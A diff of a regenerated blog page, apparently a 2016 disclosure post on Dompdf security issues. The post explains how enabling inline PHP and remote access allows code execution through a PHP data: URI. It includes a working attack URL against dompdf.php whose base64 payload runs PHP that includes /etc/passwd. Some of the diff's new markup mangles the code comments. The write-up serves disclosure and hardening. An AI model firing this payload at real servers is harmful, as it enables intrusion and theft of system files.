@@ -49,7 +49,7 @@
         <div class="navbar-collapse collapse">
           <ul class="nav navbar-nav">
             <li ><a href="/" class="glyphicon glyphicon-home">&nbsp;Home</a></li>
-            <li class="active"><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
+            <li ><a href="/archives/" class="glyphicon glyphicon-th">&nbsp;Archives</a></li>
             <li ><a href="/contact/" class="glyphicon glyphicon-earphone">&nbsp;Contact</a></li>
             <li><a class="glyphicon glyphicon-eye-open" href="/feed.xml">&nbsp;RSS Feed</a></li>
           </ul>
@@ -77,7 +77,7 @@
             <div class="page-header">
             <h1>Web Security, Dompdf security issues details
             <br/><span><i class="glyphicon glyphicon-time">&nbsp;</i><time datetime="2016-12-19">Dec 19, 2016</time></span>
-            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/english/">english</a> and <a href="/security/">security</a></span>
+            <span class="category"><i class="glyphicon glyphicon-list">&nbsp;</i> <a href="/Security/">Security</a> and <a href="/english/">english</a></span>
             </h1>
             </div>
         </header>
@@ -240,29 +240,29 @@ everybody, even google.</p>
 <p>Let's first have a look at theses strange settings, that you should not allow,
 from the config file:</p>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">/**</span>
-<span class="x">* Enable inline PHP</span>
-<span class="x">*</span>
-<span class="x">* If this setting is set to true then DOMPDF will automatically evaluate</span>
-<span class="x">* inline PHP contained within &lt;script type=&quot;text/php&quot;&gt; ... &lt;/script&gt; tags.</span>
-<span class="x">*</span>
-<span class="x">* Attention!</span>
-<span class="x">* Enabling this for documents you do not trust (e.g. arbitrary remote html</span>
-<span class="x">* pages) is a security risk. Inline scripts are run with the same level of</span>
-<span class="x">* system access available to dompdf. Set this option to false (recommended)</span>
-<span class="x">* if you wish to process untrusted documents.</span>
-<span class="x">*</span>
-<span class="x">* @var bool</span>
+<p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">/<em><em></span>
+<span class="x"></em> Enable inline PHP</span>
+<span class="x"></em></span>
+<span class="x"><em> If this setting is set to true then DOMPDF will automatically evaluate</span>
+<span class="x"></em> inline PHP contained within &lt;script type=&quot;text/php&quot;&gt; ... &lt;/script&gt; tags.</span>
+<span class="x"><em></span>
+<span class="x"></em> Attention!</span>
+<span class="x"><em> Enabling this for documents you do not trust (e.g. arbitrary remote html</span>
+<span class="x"></em> pages) is a security risk. Inline scripts are run with the same level of</span>
+<span class="x"><em> system access available to dompdf. Set this option to false (recommended)</span>
+<span class="x"></em> if you wish to process untrusted documents.</span>
+<span class="x"><em></span>
+<span class="x"></em> @var bool</span>
 <span class="x">*/</span>
-<span class="x">def(&quot;DOMPDF_ENABLE_PHP&quot;, false);</span>
+<span class="x">def(&quot;DOMPDF_ENABLE_PHP&quot;, false);</span></p>
 
-<span class="x">/**</span>
+<p><span class="x">/<em><em></span>
 <span class="x"> * Enable remote file access</span>
-<span class="x"> *</span>
+<span class="x"> </em></span>
 <span class="x"> * If this setting is set to true, DOMPDF will access remote sites for</span>
 <span class="x"> * images and CSS files as required.</span>
 <span class="x"> * This is required for part of test case www/test/image_variants.html through www/examples.php</span>
-<span class="x"> *</span>
+<span class="x"> </em></span>
 <span class="x"> * Attention!</span>
 <span class="x"> * This can be a security risk, in particular in combination with DOMPDF_ENABLE_PHP and</span>
 <span class="x"> * allowing remote access to dompdf.php or on allowing remote html code to be passed to</span>
@@ -270,11 +270,10 @@ from the config file:</p>
 <span class="x"> * This allows anonymous users to download legally doubtful internet content which on</span>
 <span class="x"> * tracing back appears to being downloaded by your server, or allows malicious php code</span>
 <span class="x"> * in remote html pages to be executed by your server with your account privileges.</span>
-<span class="x"> *</span>
+<span class="x"> <em></span>
 <span class="x"> * @var bool</span>
-<span class="x"> */</span>
-<span class="x">def(&quot;DOMPDF_ENABLE_REMOTE&quot;, false);</span></code></pre></div>
-
+<span class="x"> </em>/</span>
+<span class="x">def(&quot;DOMPDF_ENABLE_REMOTE&quot;, false);</span></code></pre></figure></p>
 
 <p>Reading that I wonder <strong>why people would activate these settings</strong> ? In fact the
 <em><code>enable_remote</code></em> is the easiest way to have images in your PDF, if you have
@@ -298,8 +297,7 @@ PDF by giving the full encoded image as a data uri parameter.</p>
 
 <p>The old trick for dompdf images was using HTML sources in this form:</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&quot;</span><span class="nt">&gt;</span></code></pre></div>
-
+<p><figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;data:image/jpeg;base64,HERE_SOME_BASE64_ENCODED_BINARY_THINGS&quot;</span><span class="p">&gt;</span></code></pre></figure></p>
 
 <p>Using <strong>data</strong> to embed images in the PDF is a nice hack, if you have never seen a
 data-uri image check github's 404 pages HTML sources.</p>
@@ -310,28 +308,24 @@ mime type <code>application/x-httpd-php</code> (you could also try XML files for
 
 <p>Let's say I have this small PHP script:</p>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="k">echo</span> <span class="s1">&#39;PHP RCE : &#39;</span> <span class="o">.</span> <span class="nb">phpversion</span><span class="p">();</span>
 <span class="k">echo</span> <span class="s2">&quot;bye&quot;</span><span class="p">;</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
-
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></figure></p>
 
 <p>Note that I could do some other things in PHP, that's just an example.</p>
 
 <p>In a data URI source this same PHP script content can be written like that (base64 encoding is just a way of rewritting something in ascii-7):</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html">data:application/x-httpd-php;charset=utf-8;base64,PD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8+</code></pre></div>
-
+<p><figure class="highlight"><pre><code class="language-html" data-lang="html">data:application/x-httpd-php;charset=utf-8;base64,PD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8+</code></pre></figure></p>
 
 <p>With some url encoding (because we'll use that on an url) that is:</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html">data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8%2B</code></pre></div>
-
+<p><figure class="highlight"><pre><code class="language-html" data-lang="html">data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmVjaG8gJ1BIUCBSQ0UgOiAnIC4gcGhwdmVyc2lvbigpOw0KZWNobyAiYnllIjsNCj8%2B</code></pre></figure></p>
 
 <p>And the final attack is:</p>
 
-<div class="highlight"><pre><code class="language-html" data-lang="html">http://<span class="nt">&lt;target&gt;</span>/<span class="nt">&lt;path&gt;</span>/dompdf/dompdf.php?base_path=<span class="err">&amp;</span>options[Attachment]=0<span class="err">&amp;</span>input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B</code></pre></div>
-
+<p><figure class="highlight"><pre><code class="language-html" data-lang="html">http://<span class="p">&lt;</span><span class="nt">target</span><span class="p">&gt;</span>/<span class="p">&lt;</span><span class="nt">path</span><span class="p">&gt;</span>/dompdf/dompdf.php?base_path=<span class="err">&amp;</span>options[Attachment]=0<span class="err">&amp;</span>input_file=data%3Aapplication%2Fx-httpd-php%3Bcharset%3Dutf-8%3Bbase64%2CPD9waHANCmluY2x1ZGUgKCcvZXRjL3Bhc3N3ZCcpOw0KZWNobyAiYnllIjsNCj8%2B</code></pre></figure></p>
 
 <p>If default settings for <code>DOMPDF_ENABLE_PHP</code> and <code>DOMPDF_ENABLE_REMOTE</code> are
 altered (to true) this attack will successfully run the PHP script and render
@@ -399,9 +393,14 @@ web document root.</li>
                 </div>
                 <div class="list-group" role="navigation">
                   
-                     <a class="list-group-item" href="/security/english/2018/07/03/security_pound_http_smuggling/">
+                     <a class="list-group-item" href="/english/security/2018/07/03/security_pound_http_smuggling/">
                      <h4>Security: HTTP Smuggling, Apsis Pound load balancer</h4>
                      <p>details of CVE-2016-10711 (published feb 2018).</p>
+                     </a>
+                  
+                     <a class="list-group-item" href="/english/postgresql/2017/06/26/postgresql_advanced_generate_series/">
+                     <h4>PostgreSQL, advanced use of generate_series for data generation</h4>
+                     <p>filling thousands of random realistic data rows.</p>
                      </a>
                   
                      <a class="list-group-item" href="/security/english/2016/06/10/security_play_with_implicit_html_and_closing_divs/">
@@ -419,11 +418,6 @@ web document root.</li>
                      <p>Exploitation of Integer Overflow with the HTTP Content length Header</p>
                      </a>
                   
-                     <a class="list-group-item" href="/security/english/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/">
-                     <h4>Details of DRUPAL_SA_CORE_2014_003 Deny Of Service</h4>
-                     <p>Analysis of the new DRUPAL_SA_CORE_2014_003 DOS vulnerability (CVE-2014-5019)</p>
-                     </a>
-                  
                 </div>
               </div>
               
@@ -434,11 +428,11 @@ web document root.</li>
                 </div>
                 <div class="list-group" role="navigation">
                   
-                     <a class="list-group-item" href="/security/english/2018/07/03/security_pound_http_smuggling/">
+                     <a class="list-group-item" href="/english/security/2018/07/03/security_pound_http_smuggling/">
                      Security: HTTP Smuggling, Apsis Pound load balancer
                      </a>
                   
-                     <a class="list-group-item" href="/postgresql/english/2017/06/26/postgresql_advanced_generate_series/">
+                     <a class="list-group-item" href="/english/postgresql/2017/06/26/postgresql_advanced_generate_series/">
                      PostgreSQL, advanced use of generate_series for data generation
                      </a>
                   
@@ -463,46 +457,46 @@ web document root.</li>
                 </div>
 
                 <div class="tagcloud">
-                <a style='font-size: 28px' class='taglink' href='/tag/HTTP/'>HTTP</a>
-<a style='font-size: 22px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Pound/'>Pound</a>
-<a style='font-size: 22px' class='taglink' href='/tag/Proxy/'>Proxy</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
-<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
-<a style='font-size: 32px' class='taglink' href='/tag/Apache/'>Apache</a>
-<a style='font-size: 32px' class='taglink' href='/tag/PHP/'>PHP</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Cache/'>Cache</a>
-<a style='font-size: 22px' class='taglink' href='/tag/mod_rewrite/'>mod_rewrite</a>
-<a style='font-size: 28px' class='taglink' href='/tag/Performance/'>Performance</a>
-<a style='font-size: 22px' class='taglink' href='/tag/Nginx/'>Nginx</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
-<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>
+                <a style='font-size: 12px' class='taglink' href='/tag/Cache/'>Cache</a>
 <a style='font-size: 18px' class='taglink' href='/tag/RewriteMap/'>RewriteMap</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
-<a style='font-size: 18px' class='taglink' href='/tag/CVE/'>CVE</a>
-<a style='font-size: 18px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
-<a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
-<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
-<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
-<a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
-<a style='font-size: 31px' class='taglink' href='/tag/Drupal/'>Drupal</a>
-<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
+<a style='font-size: 28px' class='taglink' href='/tag/Performance/'>Performance</a>
+<a style='font-size: 22px' class='taglink' href='/tag/Proxy/'>Proxy</a>
+<a style='font-size: 30px' class='taglink' href='/tag/HTTP/'>HTTP</a>
 <a style='font-size: 12px' class='taglink' href='/tag/Accumulated/'>Accumulated</a>
+<a style='font-size: 12px' class='taglink' href='/tag/js/'>js</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Web/'>Web</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HAProxy/'>HAProxy</a>
 <a style='font-size: 18px' class='taglink' href='/tag/Injection/'>Injection</a>
-<a style='font-size: 24px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
+<a style='font-size: 22px' class='taglink' href='/tag/mod_rewrite/'>mod_rewrite</a>
+<a style='font-size: 31px' class='taglink' href='/tag/Drupal/'>Drupal</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Monitoring/'>Monitoring</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Mongodb/'>Mongodb</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Varnish/'>Varnish</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bug/'>Bug</a>
+<a style='font-size: 22px' class='taglink' href='/tag/PostgreSQL/'>PostgreSQL</a>
+<a style='font-size: 18px' class='taglink' href='/tag/APC/'>APC</a>
+<a style='font-size: 22px' class='taglink' href='/tag/Nginx/'>Nginx</a>
+<a style='font-size: 32px' class='taglink' href='/tag/Security/'>Security</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HTML/'>HTML</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Pound/'>Pound</a>
 <a style='font-size: 18px' class='taglink' href='/tag/jinja/'>jinja</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
-<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
+<a style='font-size: 31px' class='taglink' href='/tag/PHP/'>PHP</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Dojo/'>Dojo</a>
 <a style='font-size: 12px' class='taglink' href='/tag/Js/'>Js</a>
+<a style='font-size: 18px' class='taglink' href='/tag/CVE/'>CVE</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Managed/'>Managed</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Ajax/'>Ajax</a>
+<a style='font-size: 18px' class='taglink' href='/tag/PHP-fpm/'>PHP-fpm</a>
+<a style='font-size: 12px' class='taglink' href='/tag/HTML5/'>HTML5</a>
+<a style='font-size: 12px' class='taglink' href='/tag/ZendFramework/'>ZendFramework</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Statistics/'>Statistics</a>
+<a style='font-size: 24px' class='taglink' href='/tag/SaltStack/'>SaltStack</a>
+<a style='font-size: 18px' class='taglink' href='/tag/BlockReplace/'>BlockReplace</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Plone/'>Plone</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Linux/'>Linux</a>
+<a style='font-size: 18px' class='taglink' href='/tag/Smuggling/'>Smuggling</a>
+<a style='font-size: 12px' class='taglink' href='/tag/Bash/'>Bash</a>
+<a style='font-size: 32px' class='taglink' href='/tag/Apache/'>Apache</a>
 
                 </div>
               </div>
@@ -517,7 +511,7 @@ web document root.</li>
                 <a href="https://plus.google.com/111280074129555323484?rel=author" target="_blank"><img src="/theme/img/google-plus-thumb.png" width="48" height="48" alt="G+" title="G+"></a>
                 <a href="http://www.flickr.com/photos/regilero/" target="_blank"><img src="/theme/img/flickr_thumb.png" width="48" height="48" alt="Flickr photos" title="Flickr photos"></a>
                 <a href="http://stackoverflow.com/users/550618/regilero" target="_blank"><img src="http://stackoverflow.com/users/flair/550618.png" width="208" height="58" alt="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers" title="profile for regilero at Stack Overflow, Q&amp;A for professional and enthusiast programmers"></a>
-                <a href="http://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
+                <a href="https://stackexchange.com/users/264377/regilero"  target="_blank"><img src="http://stackexchange.com/users/flair/264377.png?theme=clean" width="208" height="58" alt="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" title="profile for regilero on Stack Exchange, a network of free, community-driven Q&amp;A sites" /></a>
             </div>
             <div class="sideBarItem">
               <h3>Some Friends</h3>
